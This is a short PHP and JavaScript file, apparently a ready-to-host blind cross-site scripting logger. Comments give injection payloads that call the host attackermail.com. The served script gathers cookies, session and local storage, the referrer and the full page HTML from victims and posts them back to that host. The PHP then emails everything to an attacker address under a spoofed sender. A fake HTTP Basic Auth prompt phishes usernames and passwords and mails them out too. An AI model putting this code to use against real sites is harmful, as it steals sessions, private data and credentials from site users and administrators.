<?php
// Host this file on webserver and inject it on vulnerable page.
// <script>new Image().src="https://attackermail.com/xsslogger.php?cookie="+document.cookie;</script>
// <script src="https://attackermail.com/xss-blind.php"></script>
header('Content-Type: text/javascript');
?>
var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage);
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;

var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));

<?php
header("Access-Control-Allow-Origin: " . $_POST["origin"]);
$origin = $_POST["origin"];
$to = "xss-blind@attackermail.com";
$subject = "XSS Blind Report for: " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];
$headers = "From: xssed@victim.org" . "\r\n";
if ($origin && $msg) {
  mail($to, $subject, $msg, $headers);
}
// Phish for creds on HTTP Basic Auth protected backends
if (!isset($_SERVER['PHP_AUTH_USER']) && !isset($_SERVER['PHP_AUTH_PW'])) {
  header("WWW-Authenticate: Basic realm=\"Protected Area\"");
  header("HTTP/1.0 401 Unauthorized");
} else {
  $subject2 = "XSS Blind Report: HTTP Basic Auth Creds";
  $msg2 = $_SERVER['PHP_AUTH_USER'] .":".$_SERVER['PHP_AUTH_PW'];
  mail($to, $subject2, $msg2, $headers);
}
?>
